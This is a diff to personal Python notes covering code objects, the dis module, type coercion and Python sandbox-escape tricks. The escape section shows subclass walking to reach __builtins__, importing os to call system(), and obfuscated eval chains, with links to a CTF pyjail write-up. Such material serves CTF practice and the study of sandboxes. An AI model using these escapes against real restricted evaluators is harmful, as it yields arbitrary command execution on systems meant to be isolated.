@@ -272,11 +272,25 @@ python -mtimeit -s 'xs=range(10)' 'map(hex, xs)'
 
 ```python
 import dis
-listComp = compile('[f(x) for x in xs]', 'listComp', 'eval')
-dis.dis(listComp)
-listComp.co_consts
-dis.dis(listComp.co_consts[0])
+list_compiled = compile('[f(x) for x in xs]', 'listComp', 'eval')
+# ||
+list_compiled = compile('[f(x) for x in xs]', 'listComp', 'exec')
+dis.dis(list_compiled)
+
+def foo(): return 123
+foo.__code__.co_code
+# b'd\x01S\x00'
+dis.dis(foo.__code__.co_code)
+# 0 LOAD_CONST               1 (1)
+# 2 RETURN_VALUE
+foo.__code__.co_consts
+# (None, 123)
+
+# python2
+foo.func_code.co_consts
 ```
+
+https://late.am/post/2012/03/26/exploring-python-code-objects.html
 
 # Memory Allocation / Storage
 
@@ -451,10 +465,38 @@ print(df.to_markdown())
     ```
 - altenative for `__builtins__` or `import`
     ```python
+    ''.__dir__()
+
     classes = {}.__class__.__base__.__subclasses__()
+    # ||
+    classes = ''.__class__.__mro__[1].__subclasses__()
     # e.g. 49 = warnings.catch_warnings
     b = classes[49]()._module.__builtins__
     m = b['__import__']('os')
     m.system("foo")
+
+    print(eval(eval('"alles.__".'+str(print.__class__)[9]+'ppe'+'r()')+'code__.co_consts'))
     ```
+    - [CTFtime\.org / ALLES! CTF 2020 / Pyjail ATricks / Writeup](https://ctftime.org/writeup/23289)
     - https://gynvael.coldwind.pl/n/python_sandbox_escape
+- alternative for chars
+    ```python
+    print(str(print.__class__))
+    # "<class 'builtin_function_or_method'>"
+    # 'b' : 'str(print.__class__)[8]',
+    eval.__doc__
+    # 'Evaluate the given source in the context of globals and locals.\n\nThe source may be a string representing a Python expression\nor a code object as returned by compile().\nThe globals must be a dictionary and locals can be any mapping,\ndefaulting to the current globals and locals.\nIf only globals is given, locals defaults to it.'
+    ```
+
+### type coercion
+
+```python
+not 1
+# False
+not not 1
+# True
++False
+# 0
++True
+# 1
+```
